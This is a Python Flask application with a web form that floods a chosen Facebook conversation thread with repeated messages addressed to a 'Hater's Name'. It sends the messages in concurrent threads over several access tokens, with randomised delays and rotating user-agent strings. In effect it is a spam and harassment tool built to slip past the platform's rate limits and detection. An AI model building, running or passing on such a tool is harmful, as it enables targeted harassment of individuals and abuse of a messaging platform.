from flask import Flask, request, render_template_string
import threading
import requests
import time
import os
import random
from platform import system

# Initialize Flask app
app = Flask(__name__)

# HTML template for the main page
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messaging Server Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            margin-top: 50px;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 60%;
        }
        h1 {
            color: #333;
        }
        label {
            display: block;
            margin-top: 10px;
            color: #555;
        }
        input, textarea {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            margin-top: 15px;
            padding: 10px 20px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message Sending Interface</h1>
        <form action="/send_message" method="post">
            <label for="thread_id">Thread ID:</label>
            <input type="text" id="thread_id" name="thread_id" required>
            
            <label for="haters_name">Hater's Name:</label>
            <input type="text" id="haters_name" name="haters_name" required>
            
            <label for="message">Message:</label>
            <textarea id="message" name="message" rows="4" required></textarea>
            
            <label for="delay">Delay (in seconds):</label>
            <input type="number" id="delay" name="delay" min="0" step="1" required>
            
            <label for="msg_limit">Message Limit:</label>
            <input type="number" id="msg_limit" name="msg_limit" min="1" required>
            
            <button type="submit">Send Messages</button>
        </form>
    </div>
</body>
</html>
'''

# Function to send a message in a separate thread
def send_message_thread(thread_id, haters_name, access_token, message, headers, message_index, delay):
    url = f"https://graph.facebook.com/v17.0/t_{thread_id}/"
    parameters = {'access_token': access_token, 'message': f"{haters_name} {message}"}
    
    retries = 3  # Retry logic for failed requests
    for attempt in range(retries):
        response = requests.post(url, json=parameters, headers=headers)
        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        
        if response.ok:
            print(f"[+] Message {message_index + 1} sent to Convo {thread_id}: {haters_name} {message}")
            print(f"  - Time: {current_time}\n")
            break
        else:
            print(f"[x] Failed to send Message {message_index + 1}: {haters_name} {message}")
            print(f"  - Time: {current_time}, Attempt: {attempt + 1}")
            time.sleep(random.uniform(0.001, 0.003))  # Wait between 1 and 3 ms before retrying

    # Random delay after sending each message (in seconds + milliseconds)
    if delay > 0:
        millisecond_delay = random.uniform(0.05, 0.15)  # Random delay between 50ms and 150ms
        time.sleep(delay + millisecond_delay)

# Route for the main page
@app.route('/')
def home():
    return render_template_string(html_template)

# Route to handle message sending
@app.route('/send_message', methods=['POST'])
def send_message():
    thread_id = request.form['thread_id']
    haters_name = request.form['haters_name']
    message = request.form['message']
    delay = float(request.form['delay'])
    msg_limit = int(request.form['msg_limit'])

    # Replace these with real access tokens and user-agent rotation
    access_tokens = ['dummy_access_token_1', 'dummy_access_token_2']  # Replace with actual tokens or load from file
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'
        ]),
        'Referer': 'https://www.example.com',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    try:
        message_index = 0
        for access_token in access_tokens:
            threads = []
            for _ in range(msg_limit):
                # Start each message in a new thread with randomized millisecond delays
                time.sleep(random.uniform(0.01, 0.10))  # Random 10-100 ms delay before starting each thread
                
                thread = threading.Thread(
                    target=send_message_thread,
                    args=(thread_id, haters_name, access_token, message, headers, message_index, delay)
                )
                thread.start()
                threads.append(thread)
                message_index += 1

            for thread in threads:
                thread.join()

        return "Messages sent successfully!"
    except Exception as e:
        return f"An error occurred: {e}"

# Run the Flask server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
